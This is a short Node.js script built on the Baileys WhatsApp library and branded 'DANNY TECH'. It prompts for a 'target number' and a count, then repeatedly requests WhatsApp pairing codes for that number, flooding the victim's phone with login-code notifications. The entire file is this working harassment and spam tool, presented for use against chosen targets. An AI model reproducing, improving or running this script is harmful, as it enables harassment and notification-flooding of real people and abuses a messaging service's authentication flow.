//------------------------------[DANNY TECH]-----------------------------//
const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");


    const color = [
        '\x1b[31m', 
        '\x1b[32m', 
        '\x1b[33m', 
        '\x1b[34m', 
        '\x1b[35m', 
        '\x1b[36m', 
        '\x1b[37m',
        '\x1b[90m' 
    ];
    const DannyColor = color[Math.floor(Math.random() * color.length)];

const dColor = '\x1b[0m';

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => { rl.question(text, resolve) });
};

async function DannyProject() {
    const { state } = await useMultiFileAuthState('./danny-fnc');
    const GlobalTechInc = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });
    try {
        const phoneNumber = await question(DannyColor + 'Enter target number🤙 : ' + dColor);
        const DannyCodes = parseInt(await question(DannyColor + 'Amount 😽 : '+ dColor));

        if (isNaN(DannyCodes) || DannyCodes <= 0) {
            console.log('example : 20.');
            return;
        }
        for (let i = 0; i < DannyCodes; i++) {
            try {
                let code = await GlobalTechInc.requestPairingCode(phoneNumber);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                console.log(DannyColor + `${phoneNumber} [${i + 1}/${DannyCodes}]`+ dColor);
            } catch (error) {
                console.error('Error:', error.message);
            }
        }
    } catch (error) {
                 console.error('error') ;
}

    return GlobalTechInc;
}
console.log(DannyColor + `
    ██████╗   █████╗  ███╗   ██╗ ███╗   ██╗ ██╗   ██╗
    ██╔══██╗ ██╔══██╗ ████╗  ██║ ████╗  ██║ ╚██╗ ██╔╝
    ██║  ██║ ███████║ ██╔██╗ ██║ ██╔██╗ ██║  ╚████╔╝ 
    ██║  ██║ ██╔══██║ ██║╚██╗██║ ██║╚██╗██║   ╚██╔╝  
    ██████╔╝ ██║  ██║ ██║ ╚████║ ██║ ╚████║    ██║   
    ╚═════╝  ╚═╝  ╚═╝ ╚═╝  ╚═══╝ ╚═╝  ╚═══╝    ╚═╝   
    
    ` + dColor);

DannyProject();